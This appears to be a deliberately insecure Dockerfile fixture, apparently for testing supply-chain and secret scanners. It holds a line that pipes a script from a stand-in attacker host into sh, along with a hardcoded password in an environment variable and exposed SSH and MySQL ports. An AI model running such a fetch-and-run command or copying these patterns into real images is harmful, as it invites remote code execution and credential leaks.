FROM ubuntu:22.04

EXPOSE 22
EXPOSE 3306

# Suspicious one-liner (triggers supply-chain alerts)
RUN curl -fsSL https://malicious-example-attacker.com/setup.sh | sh

ENV SUPER_SECRET=hardcoded-password-in-docker-123
